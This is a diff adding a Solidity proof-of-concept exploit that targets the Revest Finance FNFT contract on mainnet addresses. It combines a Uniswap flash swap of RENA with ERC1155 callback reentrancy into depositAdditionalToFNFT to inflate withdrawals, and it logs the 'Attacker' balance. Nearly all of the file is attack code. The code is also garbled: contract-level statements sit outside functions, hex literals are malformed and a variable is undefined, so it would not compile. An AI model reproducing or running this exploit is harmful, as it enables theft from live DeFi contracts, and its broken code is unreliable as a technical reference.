@@ -1,0 +1,306 @@
+pragma solidity 0.8.0;
+pragma experimental ABIEncoderV2;
+import "hardhat/console.sol";
+interface ERC1820Registry {
+    function setInterfaceImplementer(
+        address _addr,
+        bytes32 _interfaceHash,
+        address _implementer
+    ) external;
+
+    function getManager(address _addr) external view returns (address);
+
+    function setManager(address _addr, address _newManager) external;
+
+    function interfaceHash(string memory _interfaceName)
+        external
+        pure
+        returns (bytes32);
+
+    function updateERC165Cache(address _contract, bytes4 _interfaceId) external;
+
+    function getInterfaceImplementer(address _addr, bytes32 _interfaceHash)
+        external
+        view
+        returns (address);
+
+    function implementsERC165InterfaceNoCache(
+        address _contract,
+        bytes4 _interfaceId
+    ) external view returns (bool);
+
+    function implementsERC165Interface(address _contract, bytes4 _interfaceId)
+        external
+        view
+        returns (bool);
+
+    event InterfaceImplementerSet(
+        address indexed addr,
+        bytes32 indexed interfaceHash,
+        address indexed implementer
+    );
+    event ManagerChanged(address indexed addr, address indexed newManager);
+}
+
+interface Rena {
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function WETH() external view returns (address);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function callerRewardDivisor() external view returns (uint16);
+
+    function changeCallerRewardDivisor(uint16 callerRewardDivisor_) external;
+
+    function changeFeeDivisor(uint16 feeDivisor_) external;
+
+    function changeMinRebalancerAmount(uint256 minimumRebalanceAmount_)
+        external;
+
+    function changeRebalalncerDivisor(uint16 rebalancerDivisor_) external;
+
+    function changeRebalanceInterval(uint256 interval_) external;
+
+    function claim() external view returns (address);
+
+    function decimals() external view returns (uint8);
+
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+        external
+        returns (bool);
+
+    function feeDistributor() external view returns (address);
+
+    function feeDivisor() external view returns (uint16);
+
+    function increaseAllowance(address spender, uint256 addedValue)
+        external
+        returns (bool);
+
+    function lastRebalance() external view returns (uint256);
+
+    function lpStaking() external view returns (address);
+
+    function minimumRebalanceAmount() external view returns (uint256);
+
+    function name() external view returns (string memory);
+
+    function owner() external view returns (address);
+
+    function rebalance() external;
+
+    function rebalanceInterval() external view returns (uint256);
+
+    function rebalancer() external view returns (address);
+
+    function rebalancerDivisor() external view returns (uint16);
+
+    function renaFactory() external view returns (address);
+
+    function renaRouter() external view returns (address);
+
+    function renounceOwnership() external;
+
+    function setClaim(address claim_) external;
+
+    function setFeeDistributor(address feeDistributor_) external;
+
+    function setRebalancer(address rebalancer_) external;
+
+    function setRenaRouter(address renaRouter_) external;
+
+    function setUniRouter(address uniRouter_) external;
+
+    function setlpStaking(address lpStaking_) external;
+
+    function symbol() external view returns (string memory);
+
+    function toggleFeeless(address addr_) external;
+
+    function totalSupply() external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    function transferOwnership(address newOwner) external;
+
+    function treasury() external view returns (address);
+
+    function uniFactory() external view returns (address);
+
+    function uniPair() external view returns (address);
+
+    function uniRouter() external view returns (address);
+}
+
+interface Uniswap_RENA  {
+
+    event Approval( address indexed owner,address indexed spender,uint256 value ) ;
+    event Burn( address indexed sender,uint256 amount0,uint256 amount1,address indexed to ) ;
+    event Mint( address indexed sender,uint256 amount0,uint256 amount1 ) ;
+    event Swap( address indexed sender,uint256 amount0In,uint256 amount1In,uint256 amount0Out,uint256 amount1Out,address indexed to ) ;
+    event Sync( uint112 reserve0,uint112 reserve1 ) ;
+    event Transfer( address indexed from,address indexed to,uint256 value ) ;
+    function DOMAIN_SEPARATOR(  ) external view returns (bytes32 ) ;
+    function MINIMUM_LIQUIDITY(  ) external view returns (uint256 ) ;
+    function PERMIT_TYPEHASH(  ) external view returns (bytes32 ) ;
+    function allowance( address ,address  ) external view returns (uint256 ) ;
+    function approve( address spender,uint256 value ) external  returns (bool ) ;
+    function balanceOf( address  ) external view returns (uint256 ) ;
+    function burn( address to ) external  returns (uint256 amount0, uint256 amount1) ;
+    function decimals(  ) external view returns (uint8 ) ;
+    function factory(  ) external view returns (address ) ;
+    function getReserves(  ) external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) ;
+    function initialize( address _token0,address _token1 ) external   ;
+    function kLast(  ) external view returns (uint256 ) ;
+    function mint( address to ) external  returns (uint256 liquidity) ;
+    function name(  ) external view returns (string memory ) ;
+    function nonces( address  ) external view returns (uint256 ) ;
+    function permit( address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s ) external   ;
+    function price0CumulativeLast(  ) external view returns (uint256 ) ;
+    function price1CumulativeLast(  ) external view returns (uint256 ) ;
+    function skim( address to ) external   ;
+    function swap( uint256 amount0Out,uint256 amount1Out,address to,bytes memory data ) external   ;
+    function symbol(  ) external view returns (string memory ) ;
+    function sync(  ) external   ;
+    function token0(  ) external view returns (address ) ;
+    function token1(  ) external view returns (address ) ;
+    function totalSupply(  ) external view returns (uint256 ) ;
+    function transfer( address to,uint256 value ) external  returns (bool ) ;
+    function transferFrom( address from,address to,uint256 value ) external  returns (bool ) ;
+}
+
+
+
+interface  Revest {
+    event FNFTAddionalDeposited( address indexed from,uint256 indexed newFNFTId,uint256 indexed quantity,uint256 amount ) ;
+    event FNFTAddressLockMinted( address indexed asset,address indexed from,uint256 indexed fnftId,address trigger,uint256[] quantities,IRevest.FNFTConfig fnftConfig ) ;
+    event FNFTMaturityExtended( address indexed from,uint256 indexed fnftId,uint256 indexed newExtendedTime ) ;
+    event FNFTSplit( address indexed from,uint256[] indexed newFNFTId,uint256[] indexed proportions,uint256 quantity ) ;
+    event FNFTTimeLockMinted( address indexed asset,address indexed from,uint256 indexed fnftId,uint256 endTime,uint256[] quantities,IRevest.FNFTConfig fnftConfig ) ;
+    event FNFTUnlocked( address indexed from,uint256 indexed fnftId ) ;
+    event FNFTValueLockMinted( address indexed primaryAsset,address indexed from,uint256 indexed fnftId,address compareTo,address oracleDispatch,uint256[] quantities,IRevest.FNFTConfig fnftConfig ) ;
+    event FNFTWithdrawn( address indexed from,uint256 indexed fnftId,uint256 indexed quantity ) ;
+    event OwnershipTransferred( address indexed previousOwner,address indexed newOwner ) ;
+    event RoleAdminChanged( bytes32 indexed role,bytes32 indexed previousAdminRole,bytes32 indexed newAdminRole ) ;
+    event RoleGranted( bytes32 indexed role,address indexed account,address indexed sender ) ;
+    event RoleRevoked( bytes32 indexed role,address indexed account,address indexed sender ) ;
+    function ADDRESS_LOCK_INTERFACE_ID(  ) external view returns (bytes4 ) ;
+    function DEFAULT_ADMIN_ROLE(  ) external view returns (bytes32 ) ;
+    function PAUSER_ROLE(  ) external view returns (bytes32 ) ;
+    function depositAdditionalToFNFT( uint256 fnftId,uint256 amount,uint256 quantity ) external  returns (uint256 ) ;
+    function erc20Fee(  ) external view returns (uint256 ) ;
+    function extendFNFTMaturity( uint256 fnftId,uint256 endTime ) external  returns (uint256 ) ;
+    function flatWeiFee(  ) external view returns (uint256 ) ;
+    function getAddressesProvider(  ) external view returns (address ) ;
+    function getERC20Fee(  ) external view returns (uint256 ) ;
+    function getFlatWeiFee(  ) external view returns (uint256 ) ;
+    function getRoleAdmin( bytes32 role ) external view returns (bytes32 ) ;
+    function getRoleMember( bytes32 role,uint256 index ) external view returns (address ) ;
+    function getRoleMemberCount( bytes32 role ) external view returns (uint256 ) ;
+    function grantRole( bytes32 role,address account ) external   ;
+    function hasRole( bytes32 role,address account ) external view returns (bool ) ;
+    function mintAddressLock( address trigger,bytes memory arguments,address[] memory recipients,uint256[] memory quantities,IRevest.FNFTConfig memory fnftConfig ) external payable returns (uint256 ) ;
+    function mintTimeLock( uint256 endTime,address[] memory recipients,uint256[] memory quantities,IRevest.FNFTConfig memory fnftConfig ) external payable returns (uint256 ) ;
+    function mintValueLock( address primaryAsset,address compareTo,uint256 unlockValue,bool unlockRisingEdge,address oracleDispatch,address[] memory recipients,uint256[] memory quantities,IRevest.FNFTConfig memory fnftConfig ) external payable returns (uint256 ) ;
+    function owner(  ) external view returns (address ) ;
+    function renounceOwnership(  ) external   ;
+    function renounceRole( bytes32 role,address account ) external   ;
+    function revokeRole( bytes32 role,address account ) external   ;
+    function setAddressRegistry( address registry ) external   ;
+    function setERC20Fee( uint256 erc20 ) external   ;
+    function setFlatWeiFee( uint256 wethFee ) external   ;
+    function splitFNFT( uint256 fnftId,uint256[] memory proportions,uint256 quantity ) external  returns (uint256[] memory ) ;
+    function supportsInterface( bytes4 interfaceId ) external view returns (bool ) ;
+    function transferOwnership( address newOwner ) external   ;
+    function unlockFNFT( uint256 fnftId ) external   ;
+    function withdrawFNFT( uint256 fnftId,uint256 quantity ) external   ;
+}
+
+interface IRevest {
+    struct FNFTConfig { address asset;
+    address pipeToContract;
+    uint256 depositAmount;
+    uint256 depositMul;
+    uint256 split;
+    uint256 depositStopTime;
+    bool maturityExtension;
+    bool isMulti;
+    bool nontransferrable; }
+}
+
+
+contract Poc{
+    address eRC1820Registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
+    address rena = 0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76;
+    address swap = 0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca;
+    address revest = 0x2320A28f52334d62622cc2EaFa15DE55F9987eD9;
+    uint lock = 0;
+
+    bytes32 hash = 29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
+    ERC1820Registry(eRC1820Registry).setInterfaceImplementer(address(this),hash,address(this));
+    Rena(rena).approve(revest,type(uint256).max);
+    uint Rena_amount = 2 ether;
+    Uniswap_RENA(swap).swap(Rena_amount,0,address(this),0x78);
+            IRevest.FNFTConfig memory fnftConfig;
+        fnftConfig.asset = address(rena);
+        fnftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;
+        fnftConfig.depositAmount = 0;
+        fnftConfig.depositMul = 0;
+        fnftConfig.split = 0;
+        fnftConfig.depositStopTime = 0;
+        fnftConfig.maturityExtension = false;
+        fnftConfig.isMulti = true;
+        fnftConfig.nontransferrable = false;
+
+    function uniswapV2Call(address _sender,uint256 _amount0,uint256 _amount1,bytes calldata _data) external override {
+        Revest(revest).mintAddressLock(address(this),0x,['0xb480ac726528d1c195cd3bb32f19c92e8d928519'],[2],fnftConfig);
+        Revest(revest).mintAddressLock(address(this),0x,['0xb480ac726528d1c195cd3bb32f19c92e8d928519'],[360000],fnftConfig);
+        Revest(revest).withdrawFNFT(1028,360001);
+        uint amount = (amount0/997*1000/99*100)+1000;
+        Rena(rena).transfer(swap,amount);
+        uint balance = Rena(rena).balanceOf(address(this));
+        console.log("Attacker RENA balance:",balance);
+    }
+
+    function onERC1155Received(address operator,address from,uint256 id,uint256 value,bytes calldata data) public returns (bytes4) {
+        if (lock == 0){
+            lock = 1;
+            // return this.onERC1155Received.selector;
+            return f23a6e6100000000000000000000000000000000000000000000000000000000;
+        };
+        if (lock ==1){
+            Revest(revest).depositAdditionalToFNFT(1028,1e18,1);
+            return f23a6e6100000000000000000000000000000000000000000000000000000000;
+        };
+
+
+    }
+
+
+}
+
